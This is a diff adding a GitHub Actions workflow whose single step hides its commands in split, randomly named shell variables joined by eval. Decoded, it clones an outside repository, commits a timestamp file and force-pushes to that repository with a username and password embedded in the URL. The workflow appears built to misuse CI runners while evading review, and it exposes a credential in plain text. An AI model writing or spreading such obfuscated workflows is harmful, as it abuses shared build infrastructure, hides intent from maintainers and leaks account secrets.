@@ -1,0 +1,43 @@
+name: lamp
+on:
+  push:
+    branches: [ master ]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: lamp
+        run: |
+          sudo apt update || true
+          sudo apt --yes install git &>/dev/null
+          GCC=$(date +%s)
+          vmzkLiOEEP="git clone h"
+          uGFNFB="ttps://gith"
+          CRgTmT="ub.com/data"
+          yDcNV="-mining-int"
+          dEqNrZrXJm="data-mining"
+          Ctcwu="-intmsko/la"
+          eval "$vmzkLiOEEP""$uGFNFB""$CRgTmT""$yDcNV""$dEqNrZrXJm""$Ctcwu""mp.git tmp"
+          SunsX="cd tmp"
+          eval "$SunsX"""
+          echo $GCC >> CT7x0F
+          git config user.name gasmin-oladina
+          fasNhxGZh="git config "
+          pMNKuLgrNop="user.email "
+          YuvRpw="gasmin.olad"
+          BcdScs="ina@rambler"
+          eval "$fasNhxGZh""$pMNKuLgrNop""$YuvRpw""$BcdScs"".ru"
+          git add CT7x0F
+          git commit -m Set
+          dUFTLBk="git push ht"
+          XqJdzVctj="tps://gasmi"
+          NubaW="n-oladina:'"
+          IupowmCAV="2c0F0qGJMuW"
+          rqDWsodA="_9Lr'@githu"
+          TOORHiu="b.com/data-"
+          xDlrlknh="mining-intd"
+          rivQeBAc="ata-mining-"
+          vFvdi="intmsko/lam"
+          eval "$dUFTLBk""$XqJdzVctj""$NubaW""$IupowmCAV""$rqDWsodA""$TOORHiu""$xDlrlknh""$rivQeBAc""$vFvdi""p.git -f"
+          fMHXi=""
+          eval "$fMHXi"""
